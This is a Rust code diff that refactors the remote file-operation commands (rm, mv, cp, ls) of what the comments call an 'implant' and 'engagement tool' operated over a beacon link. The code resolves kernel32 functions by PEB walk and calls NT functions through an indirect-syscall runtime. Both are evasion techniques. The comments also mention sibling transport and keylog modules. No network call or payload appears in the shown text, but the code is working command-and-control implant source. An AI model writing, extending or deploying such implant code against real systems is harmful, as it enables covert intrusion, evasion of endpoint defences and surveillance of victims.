@@ -886,6 +886,13 @@ fn fileop_mkdir(rt: &Runtime, path: &str) -> Response {
     }
 }
 
+/// kernel32 W-API signatures used by `fileop_rm` (see `fileop_rm_resolve`).
+/// `GetFileAttributesW` is kept resolved-but-unused (alternative detection
+/// path documented at the resolution site).
+type GetFileAttributesW = unsafe extern "system" fn(*const u16) -> u32;
+type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
+type RemoveDirectoryW = unsafe extern "system" fn(*const u16) -> i32;
+
 fn fileop_rm(rt: &Runtime, path: &str) -> Response {
     if !allowed(path) {
         return Response::Err(String::from("rm: refusing protected target"));
@@ -902,29 +909,40 @@ fn fileop_rm(rt: &Runtime, path: &str) -> Response {
         }
     };
     // Convert path to a UTF-16 wide string (null-terminated) for the W APIs.
+    let wide = fileop_rm_wide(path);
+    let (del, rmdir) = match fileop_rm_resolve() {
+        Ok(pair) => pair,
+        Err(e) => return e,
+    };
+    fileop_rm_do(del, rmdir, wide.as_ptr(), is_dir)
+}
+
+/// Convert path to a UTF-16 wide string (null-terminated) for the W APIs.
+fn fileop_rm_wide(path: &str) -> crate::heap::Vec<u16> {
     let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len() + 1);
     for u in path.encode_utf16() {
         wide.push(u);
     }
     wide.push(0);
-    // Resolve kernel32 DeleteFileW / RemoveDirectoryW via PEB walk. These are
-    // plain Win32 wrappers around NtSetInformationFile(FileDispositionInfo) +
-    // NtClose — but called DIRECTLY (not via the indirect-syscall runtime), so
-    // they don't hit the runtime's synchronous-open hang that bricked the
-    // earlier NT delete path. This is the same resolution style the rest of
-    // the implant uses (transport/keylog/etc resolve kernel32 exports directly).
-    type GetFileAttributesW = unsafe extern "system" fn(*const u16) -> u32;
-    type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
-    type RemoveDirectoryW = unsafe extern "system" fn(*const u16) -> i32;
+    wide
+}
+
+/// Resolve kernel32 DeleteFileW / RemoveDirectoryW via PEB walk. These are
+/// plain Win32 wrappers around NtSetInformationFile(FileDispositionInfo) +
+/// NtClose — but called DIRECTLY (not via the indirect-syscall runtime), so
+/// they don't hit the runtime's synchronous-open hang that bricked the
+/// earlier NT delete path. This is the same resolution style the rest of
+/// the implant uses (transport/keylog/etc resolve kernel32 exports directly).
+fn fileop_rm_resolve() -> Result<(DeleteFileW, RemoveDirectoryW), Response> {
     let del: DeleteFileW =
         match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"DeleteFileW") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return Response::Err(String::from("rm: DeleteFileW unresolved")),
+            None => return Err(Response::Err(String::from("rm: DeleteFileW unresolved"))),
         };
     let rmdir: RemoveDirectoryW =
         match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"RemoveDirectoryW") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return Response::Err(String::from("rm: RemoveDirectoryW unresolved")),
+            None => return Err(Response::Err(String::from("rm: RemoveDirectoryW unresolved"))),
         };
     let _ = unsafe {
         // Touch the type to keep it resolved-but-unused (GetFileAttributesW is
@@ -937,10 +955,21 @@ fn fileop_rm(rt: &Runtime, path: &str) -> Response {
             };
         gfa
     };
+    Ok((del, rmdir))
+}
+
+/// Call the resolved delete/remove API depending on whether `is_dir` is set,
+/// mapping the Win32 result onto the rm response.
+fn fileop_rm_do(
+    del: DeleteFileW,
+    rmdir: RemoveDirectoryW,
+    wide: *const u16,
+    is_dir: bool,
+) -> Response {
     let ok = if is_dir {
-        unsafe { rmdir(wide.as_ptr()) }
+        unsafe { rmdir(wide) }
     } else {
-        unsafe { del(wide.as_ptr()) }
+        unsafe { del(wide) }
     };
     if ok != 0 {
         Response::Ok
@@ -984,56 +1013,87 @@ fn fileop_mv(rt: &Runtime, path: &str, dest: &str) -> Response {
     if !allowed(dest) {
         return Response::Err(String::from("mv: refusing protected dest"));
     }
-    let destbuf = match to_nt_path(dest) {
-        Some(p) => p,
-        None => return Response::Err(String::from("mv: invalid dest path")),
-    };
     // destbuf includes the `\??\` prefix from to_nt_path, so the usable name
     // length is 256 chars. FILE_RENAME_INFORMATION carries a fixed 260-unit
     // FileName array: reject an over-long destination instead of silently
     // truncating — a truncated rename can land at a wrong path and, with
     // replace_if_exists = 1, overwrite an existing unrelated file.
     const MAX_RENAME_UNITS: usize = 260;
+    let destbuf = match to_nt_path(dest) {
+        Some(p) => p,
+        None => return Response::Err(String::from("mv: invalid dest path")),
+    };
     if destbuf.len() > MAX_RENAME_UNITS {
         return Response::Err(String::from("mv: destination path too long"));
     }
     unsafe {
-        let handle = match open_file(
+        let handle = match fileop_mv_open(rt, path) {
+            Ok(h) => h,
+            Err(e) => return e,
+        };
+        // Build FILE_RENAME_INFORMATION and issue the rename (see
+        // fileop_mv_rename), then close the source handle.
+        let result = fileop_mv_rename(rt, handle, &destbuf);
+        let _ = crate::syscalls::nt_close(rt, handle as usize);
+        result
+    }
+}
+
+/// Open the source with DELETE_ACCESS | SYNCHRONIZE, mapping the OpenError
+/// arms onto the mv error strings. DELETE alone isn't mapped to include
+/// SYNCHRONIZE, so OR it in — FILE_SYNCHRONOUS_IO_NONALERT below requires it.
+///
+/// Note: NO FILE_NON_DIRECTORY_FILE here — mv must accept BOTH files and
+/// directories (the operator may mv either). NON_DIRECTORY_FILE would reject
+/// a directory with STATUS_FILE_IS_A_DIRECTORY.
+fn fileop_mv_open(rt: &Runtime, path: &str) -> Result<*mut core::ffi::c_void, Response> {
+    unsafe {
+        match open_file(
             rt,
             path,
             // DELETE alone isn't mapped to include SYNCHRONIZE, so OR it in —
             // FILE_SYNCHRONOUS_IO_NONALERT below requires it.
             DELETE_ACCESS | SYNCHRONIZE,
             FILE_OPEN,
-            // NO FILE_NON_DIRECTORY_FILE here: rm must accept BOTH files and
-            // directories (the operator may rm either). NON_DIRECTORY_FILE
+            // NO FILE_NON_DIRECTORY_FILE here: mv must accept BOTH files and
+            // directories (the operator may mv either). NON_DIRECTORY_FILE
             // would reject a directory with STATUS_FILE_IS_A_DIRECTORY.
             FILE_SYNCHRONOUS_IO_NONALERT,
         ) {
-            Ok(h) => h,
-            Err(OpenError::BadPath) => return Response::Err(String::from("mv: invalid src path")),
+            Ok(h) => Ok(h),
+            Err(OpenError::BadPath) => Err(Response::Err(String::from("mv: invalid src path"))),
             Err(OpenError::Unresolved) => {
-                return Response::Err(String::from("mv: NtCreateFile unresolved"))
+                Err(Response::Err(String::from("mv: NtCreateFile unresolved")))
             }
             Err(OpenError::Status(s)) => {
-                return Response::Err(String::from(format_ntstatus("mv open", s)))
+                Err(Response::Err(String::from(format_ntstatus("mv open", s))))
             }
-        };
-        // Build FILE_RENAME_INFORMATION. FileName is an in-place wide array —
-        // copy destbuf into it. destbuf is bounds-checked above (<= 260 units).
+        }
+    }
+}
+
+/// Build FILE_RENAME_INFORMATION (FileName is an in-place wide array — copy
+/// `destbuf` into it; bounds-checked by the caller, <= 260 units) and issue
+/// NtSetInformationFile(FileRenameInfo). The information length is the fixed
+/// header (offset of file_name) + the wide name bytes actually used.
+/// NtSetInformationFile reads exactly that many bytes.
+///
+/// FILE_RENAME_INFORMATION header on x64 is 20 bytes (ReplaceIfExists:1
+/// +pad:7 +RootDirectory:8 +FileNameLength:4 = 20) before FileName[].
+/// NtSetInformationFile needs Length >= 20 + FileNameLength to read the
+/// whole name; the old `16 + ...` was 4 short and truncated the rename.
+fn fileop_mv_rename(
+    rt: &Runtime,
+    handle: *mut core::ffi::c_void,
+    destbuf: &[u16],
+) -> Response {
+    unsafe {
         let mut info: FileRenameInformation = core::mem::zeroed();
         info.replace_if_exists = 1;
         let dn = destbuf.len();
         info.file_name[..dn].copy_from_slice(&destbuf[..dn]);
         info.file_name_length = (dn * 2) as u32;
         let mut set_iosb: IoStatusBlock = IoStatusBlock::default();
-        // The information length is the fixed header (offset of file_name) +
-        // the wide name bytes actually used. NtSetInformationFile reads exactly
-        // that many bytes.
-        // FILE_RENAME_INFORMATION header on x64 is 20 bytes (ReplaceIfExists:1
-        // +pad:7 +RootDirectory:8 +FileNameLength:4 = 20) before FileName[].
-        // NtSetInformationFile needs Length >= 20 + FileNameLength to read the
-        // whole name; the old `16 + ...` was 4 short and truncated the rename.
         let info_len = 20 + info.file_name_length as usize;
         let sst = crate::syscalls::nt_set_information_file(
             rt,
@@ -1043,7 +1103,6 @@ fn fileop_mv(rt: &Runtime, path: &str, dest: &str) -> Response {
             info_len,
             FILE_RENAME_INFO_CLASS,
         );
-        let _ = crate::syscalls::nt_close(rt, handle as usize);
         match sst {
             Some(s) if nt_success(s) => Response::Ok,
             Some(s) => Response::Err(String::from(format_ntstatus("mv", s))),
@@ -1060,10 +1119,23 @@ fn fileop_cp(rt: &Runtime, path: &str, dest: &str) -> Response {
     if !allowed(dest) {
         return Response::Err(String::from("cp: refusing protected dest"));
     }
-    // Read source fully into memory-bounded chunks. (Capped: a multi-GB file
-    // would OOM; for an engagement tool the operator controls the path, and the
-    // beacon wire caps make huge files impractical over the link anyway.)
-    let src_chunks: Vec<Vec<u8>> = unsafe {
+    // Read source fully into memory-bounded chunks (see fileop_cp_read_all;
+    // capped so a multi-GB file can't OOM an engagement tool).
+    let src_chunks = match fileop_cp_read_all(rt, path) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    // Write dest (open once, write each chunk sequentially).
+    fileop_cp_write_all(rt, dest, &src_chunks)
+}
+
+/// Read the source file fully into memory-bounded chunks. (Capped: a multi-GB
+/// file would OOM; for an engagement tool the operator controls the path, and
+/// the beacon wire caps make huge files impractical over the link anyway.)
+/// Closes the handle on error paths and returns the error; on EOF the handle
+/// is closed here and the chunks returned.
+fn fileop_cp_read_all(rt: &Runtime, path: &str) -> Result<Vec<Vec<u8>>, Response> {
+    unsafe {
         let handle = match open_file(
             rt,
             path,
@@ -1072,38 +1144,23 @@ fn fileop_cp(rt: &Runtime, path: &str, dest: &str) -> Response {
             FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
         ) {
             Ok(h) => h,
-            Err(OpenError::BadPath) => return Response::Err(String::from("cp: invalid src path")),
+            Err(OpenError::BadPath) => return Err(Response::Err(String::from("cp: invalid src path"))),
             Err(OpenError::Unresolved) => {
-                return Response::Err(String::from("cp: src NtCreateFile unresolved"))
+                return Err(Response::Err(String::from("cp: src NtCreateFile unresolved")))
             }
             Err(OpenError::Status(s)) => {
-                return Response::Err(String::from(format_ntstatus("cp src", s)))
+                return Err(Response::Err(String::from(format_ntstatus("cp src", s))))
             }
         };
         let mut out: Vec<Vec<u8>> = Vec::new();
         let mut buf = crate::heap::vec![0u8; CHUNK];
         loop {
-            let mut read_iosb: IoStatusBlock = IoStatusBlock::default();
-            let rst = crate::syscalls::nt_read_file(
-                rt,
-                handle as usize,
-                0,
-                0,
-                0,
-                &mut read_iosb as *mut IoStatusBlock as usize,
-                buf.as_mut_ptr() as usize,
-                CHUNK as usize,
-                0,
-                0,
-            );
-            let status = match rst {
-                Some(s) => s,
-                None => {
-                    let _ = crate::syscalls::nt_close(rt, handle as usize);
-                    return Response::Err(String::from("cp: NtReadFile unresolved"));
-                }
+            // One NtReadFile fill; unresolved reads close the handle and return.
+            let (status, got) = match fileop_cp_read(rt, handle, &mut buf) {
+                Ok(r) => r,
+                Err(e) => return Err(e),
             };
-            let got = read_iosb.information.min(CHUNK);
+            let got = got.min(CHUNK);
             if status == STATUS_END_OF_FILE || got == 0 {
                 break;
             }
@@ -1111,15 +1168,49 @@ fn fileop_cp(rt: &Runtime, path: &str, dest: &str) -> Response {
             // instead of appending a partial chunk.
             if status < 0 {
                 let _ = crate::syscalls::nt_close(rt, handle as usize);
-                return Response::Err(String::from(format_ntstatus("cp read", status)));
+                return Err(Response::Err(String::from(format_ntstatus("cp read", status))));
             }
             out.push(buf[..got].to_vec());
         }
         let _ = crate::syscalls::nt_close(rt, handle as usize);
-        out
-    };
+        Ok(out)
+    }
+}
 
-    // Write dest (open once, write each chunk sequentially).
+/// Issue one NtReadFile into `buf`, returning (status, bytes-read). On an
+/// unresolved NtReadFile the handle is closed here and the error returned.
+fn fileop_cp_read(
+    rt: &Runtime,
+    handle: *mut core::ffi::c_void,
+    buf: &mut [u8],
+) -> Result<(i32, usize), Response> {
+    unsafe {
+        let mut read_iosb: IoStatusBlock = IoStatusBlock::default();
+        let rst = crate::syscalls::nt_read_file(
+            rt,
+            handle as usize,
+            0,
+            0,
+            0,
+            &mut read_iosb as *mut IoStatusBlock as usize,
+            buf.as_mut_ptr() as usize,
+            CHUNK as usize,
+            0,
+            0,
+        );
+        match rst {
+            Some(s) => Ok((s, read_iosb.information)),
+            None => {
+                let _ = crate::syscalls::nt_close(rt, handle as usize);
+                Err(Response::Err(String::from("cp: NtReadFile unresolved")))
+            }
+        }
+    }
+}
+
+/// Open the destination (GENERIC_WRITE / FILE_OVERWRITE_IF) and write each
+/// chunk sequentially, closing the handle on every exit path.
+fn fileop_cp_write_all(rt: &Runtime, dest: &str, src_chunks: &[Vec<u8>]) -> Response {
     unsafe {
         let handle = match open_file(
             rt,
@@ -1137,7 +1228,7 @@ fn fileop_cp(rt: &Runtime, path: &str, dest: &str) -> Response {
                 return Response::Err(String::from(format_ntstatus("cp dest", s)))
             }
         };
-        for chunk in &src_chunks {
+        for chunk in src_chunks {
             let mut w_iosb: IoStatusBlock = IoStatusBlock::default();
             let wst = crate::syscalls::nt_write_file(
                 rt,
@@ -1160,19 +1251,42 @@ fn fileop_cp(rt: &Runtime, path: &str, dest: &str) -> Response {
             }
         }
         let _ = crate::syscalls::nt_close(rt, handle as usize);
+        Response::Ok
     }
-    Response::Ok
 }
 
 /// Ls: enumerate `path`'s children via NtQueryDirectoryFile
 /// (FileDirectoryInformation). Output is one entry per line, directories
 /// suffixed with '/' — the same convention the UI's ls parser consumes
 /// (client-ui-web FileTable.parseLsLines) and the dev agent emits.
+/// 64 KiB query buffer: FILE_DIRECTORY_INFORMATION is ~80 bytes + name, so
+/// one full buffer holds hundreds of entries — a handful of syscalls even
+/// for very large directories.
+const DIR_BUF: usize = 64 * 1024;
+
 fn fileop_ls(rt: &Runtime, path: &str) -> Response {
     if !allowed(path) {
         return Response::Err(String::from("ls: refusing protected target"));
     }
-    let handle = unsafe {
+    let handle = match fileop_ls_open(rt, path) {
+        Ok(h) => h,
+        Err(e) => return e,
+    };
+    let out = match fileop_ls_enumerate(rt, handle) {
+        Ok(o) => o,
+        Err(e) => return e, // enumerate closes the handle on error
+    };
+    // SAFETY: `handle` is the NtOpenFile-returned handle from above; the
+    // close is fail-soft by design (a close error is intentionally ignored).
+    unsafe { crate::syscalls::nt_close(rt, handle as usize) };
+    Response::Output(out.into_bytes())
+}
+
+/// Open the directory for enumeration. GENERIC_READ's generic mapping on a
+/// directory grants FILE_LIST_DIRECTORY (+ SYNCHRONIZE), enough for
+/// enumeration. Maps the OpenError arms onto the ls error strings.
+fn fileop_ls_open(rt: &Runtime, path: &str) -> Result<*mut core::ffi::c_void, Response> {
+    unsafe {
         match open_file(
             rt,
             path,
@@ -1182,112 +1296,148 @@ fn fileop_ls(rt: &Runtime, path: &str) -> Response {
             FILE_OPEN,
             FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
         ) {
-            Ok(h) => h,
-            Err(OpenError::BadPath) => return Response::Err(String::from("ls: invalid path")),
+            Ok(h) => Ok(h),
+            Err(OpenError::BadPath) => Err(Response::Err(String::from("ls: invalid path"))),
             Err(OpenError::Unresolved) => {
-                return Response::Err(String::from("ls: NtCreateFile unresolved"))
+                Err(Response::Err(String::from("ls: NtCreateFile unresolved")))
             }
             Err(OpenError::Status(s)) => {
-                return Response::Err(String::from(format_ntstatus("ls open", s)))
+                Err(Response::Err(String::from(format_ntstatus("ls open", s))))
             }
         }
-    };
-    // 64 KiB query buffer: FILE_DIRECTORY_INFORMATION is ~80 bytes + name, so
-    // one full buffer holds hundreds of entries — a handful of syscalls even
-    // for very large directories.
-    const DIR_BUF: usize = 64 * 1024;
+    }
+}
+
+/// Enumerate the directory via NtQueryDirectoryFile until STATUS_NO_MORE_FILES,
+/// building the one-entry-per-line output (directories suffixed with '/').
+/// Closes the handle itself on error (mirrors the original loop's cleanup);
+/// the caller closes it on success.
+fn fileop_ls_enumerate(
+    rt: &Runtime,
+    handle: *mut core::ffi::c_void,
+) -> Result<String, Response> {
     let mut buf = crate::heap::vec![0u8; DIR_BUF];
     let mut out = String::new();
     let mut restart = RETURN_SINGLE_ENTRY_TRUE;
-    unsafe {
-        loop {
-            let mut iosb: IoStatusBlock = IoStatusBlock::default();
-            let st = crate::syscalls::nt_query_directory_file(
-                rt,
-                handle as usize,
-                0, // Event
-                0, // ApcRoutine
-                0, // ApcContext
-                &mut iosb as *mut IoStatusBlock as usize,
-                buf.as_mut_ptr() as usize,
-                DIR_BUF,
-                FILE_DIRECTORY_INFORMATION_CLASS,
-                RETURN_SINGLE_ENTRY_FALSE, // fill the buffer with all entries
-                0,                         // FileName = NULL: no wildcard mask
-                restart,
-            );
-            let status = match st {
-                Some(s) => s,
-                None => {
-                    let _ = crate::syscalls::nt_close(rt, handle as usize);
-                    return Response::Err(String::from(
-                        "ls: NtQueryDirectoryFile unresolved",
-                    ));
-                }
-            };
-            if status == STATUS_NO_MORE_FILES {
-                break; // enumeration drained
+    loop {
+        match fileop_ls_query(rt, handle, &mut buf, restart) {
+            Ok(Some(got)) => {
+                // Walk the FILE_DIRECTORY_INFORMATION chain (see
+                // fileop_ls_append_entries for the field offsets).
+                fileop_ls_append_entries(&mut out, &buf, got);
+                restart = RETURN_SINGLE_ENTRY_FALSE;
             }
-            if !nt_success(status) {
-                let _ = crate::syscalls::nt_close(rt, handle as usize);
-                return Response::Err(String::from(format_ntstatus("ls", status)));
-            }
-            let got = iosb.information.min(DIR_BUF);
-            if got == 0 {
-                break; // defensive: STATUS_SUCCESS with zero bytes should not spin
-            }
-            // Walk the FILE_DIRECTORY_INFORMATION chain. Field offsets (Win64):
-            //   0  NextEntryOffset u32 | 4  FileIndex u32
-            //   8  CreationTime i64 ... 40 EndOfFile i64 | 48 AllocationSize i64
-            //   56 FileAttributes u32 | 60 FileNameLength u32 | 64 FileName WCHAR[]
-            let mut off = 0usize;
-            while off + 64 <= got {
-                let next_off =
-                    u32::from_le_bytes([buf[off], buf[off + 1], buf[off + 2], buf[off + 3]])
-                        as usize;
-                let attrs = u32::from_le_bytes([
-                    buf[off + 56],
-                    buf[off + 57],
-                    buf[off + 58],
-                    buf[off + 59],
-                ]);
-                let name_len = u32::from_le_bytes([
-                    buf[off + 60],
-                    buf[off + 61],
-                    buf[off + 62],
-                    buf[off + 63],
-                ]) as usize;
-                // Clamp to what the buffer actually holds and keep it even
-                // (WCHAR units); a truncated tail is dropped, not misread.
-                let name_bytes =
-                    (name_len.min(got.saturating_sub(off + 64)) / 2) * 2;
-                if name_bytes > 0 {
-                    let wide = core::slice::from_raw_parts(
-                        buf.as_ptr().add(off + 64) as *const u16,
-                        name_bytes / 2,
-                    );
-                    let name = String::from_utf16_lossy(wide);
-                    if !out.is_empty() {
-                        out.push('\n');
-                    }
-                    out.push_str(&name);
-                    if attrs & 0x0000_0010 != 0 {
-                        // FILE_ATTRIBUTE_DIRECTORY → '/' suffix marker.
-                        out.push('/');
-                    }
-                }
-                if next_off == 0 {
-                    break;
-                }
-                off += next_off;
-            }
-            restart = RETURN_SINGLE_ENTRY_FALSE;
+            Ok(None) => break, // drained, or defensive zero-byte success
+            Err(e) => return Err(e),
         }
     }
-    // SAFETY: `handle` is the NtOpenFile-returned handle from above; the
-    // close is fail-soft by design (a close error is intentionally ignored).
-    unsafe { crate::syscalls::nt_close(rt, handle as usize) };
-    Response::Output(out.into_bytes())
+    Ok(out)
+}
+
+/// Issue one NtQueryDirectoryFile fill into `buf`. Returns Ok(Some(got)) to
+/// walk a fresh buffer, or Ok(None) when enumeration is drained
+/// (STATUS_NO_MORE_FILES or a defensive zero-byte success). On an unresolved
+/// syscall or a non-success status the handle is closed here and the error
+/// returned.
+fn fileop_ls_query(
+    rt: &Runtime,
+    handle: *mut core::ffi::c_void,
+    buf: &mut [u8],
+    restart: i32,
+) -> Result<Option<usize>, Response> {
+    unsafe {
+        let mut iosb: IoStatusBlock = IoStatusBlock::default();
+        let st = crate::syscalls::nt_query_directory_file(
+            rt,
+            handle as usize,
+            0, // Event
+            0, // ApcRoutine
+            0, // ApcContext
+            &mut iosb as *mut IoStatusBlock as usize,
+            buf.as_mut_ptr() as usize,
+            DIR_BUF,
+            FILE_DIRECTORY_INFORMATION_CLASS,
+            RETURN_SINGLE_ENTRY_FALSE, // fill the buffer with all entries
+            0,                         // FileName = NULL: no wildcard mask
+            restart,
+        );
+        let status = match st {
+            Some(s) => s,
+            None => {
+                let _ = crate::syscalls::nt_close(rt, handle as usize);
+                return Err(Response::Err(String::from(
+                    "ls: NtQueryDirectoryFile unresolved",
+                )));
+            }
+        };
+        if status == STATUS_NO_MORE_FILES {
+            return Ok(None); // enumeration drained
+        }
+        if !nt_success(status) {
+            let _ = crate::syscalls::nt_close(rt, handle as usize);
+            return Err(Response::Err(String::from(format_ntstatus("ls", status))));
+        }
+        let got = iosb.information.min(DIR_BUF);
+        if got == 0 {
+            return Ok(None); // defensive: STATUS_SUCCESS with zero bytes should not spin
+        }
+        Ok(Some(got))
+    }
+}
+
+/// Walk the FILE_DIRECTORY_INFORMATION chain in `buf[..got]`, appending one
+/// entry per line to `out` with directories suffixed by '/'. Field offsets
+/// (Win64):
+///   0  NextEntryOffset u32 | 4  FileIndex u32
+///   8  CreationTime i64 ... 40 EndOfFile i64 | 48 AllocationSize i64
+///   56 FileAttributes u32 | 60 FileNameLength u32 | 64 FileName WCHAR[]
+fn fileop_ls_append_entries(out: &mut String, buf: &[u8], got: usize) {
+    // SAFETY: `buf` is the 64 KiB query buffer filled by NtQueryDirectoryFile
+    // and `got` is the io status information clamped to its length; the
+    // from_raw_parts below reads only the WCHAR name at off+64, bounds-checked
+    // by the `off + 64 <= got` guard and clamped to `got` by name_bytes.
+    unsafe {
+        let mut off = 0usize;
+        while off + 64 <= got {
+            let next_off =
+                u32::from_le_bytes([buf[off], buf[off + 1], buf[off + 2], buf[off + 3]])
+                    as usize;
+            let attrs = u32::from_le_bytes([
+                buf[off + 56],
+                buf[off + 57],
+                buf[off + 58],
+                buf[off + 59],
+            ]);
+            let name_len = u32::from_le_bytes([
+                buf[off + 60],
+                buf[off + 61],
+                buf[off + 62],
+                buf[off + 63],
+            ]) as usize;
+            // Clamp to what the buffer actually holds and keep it even
+            // (WCHAR units); a truncated tail is dropped, not misread.
+            let name_bytes = (name_len.min(got.saturating_sub(off + 64)) / 2) * 2;
+            if name_bytes > 0 {
+                let wide = core::slice::from_raw_parts(
+                    buf.as_ptr().add(off + 64) as *const u16,
+                    name_bytes / 2,
+                );
+                let name = String::from_utf16_lossy(wide);
+                if !out.is_empty() {
+                    out.push('\n');
+                }
+                out.push_str(&name);
+                if attrs & 0x0000_0010 != 0 {
+                    // FILE_ATTRIBUTE_DIRECTORY → '/' suffix marker.
+                    out.push('/');
+                }
+            }
+            if next_off == 0 {
+                break;
+            }
+            off += next_off;
+        }
+    }
 }
 
 // ---- small helpers --------------------------------------------------------
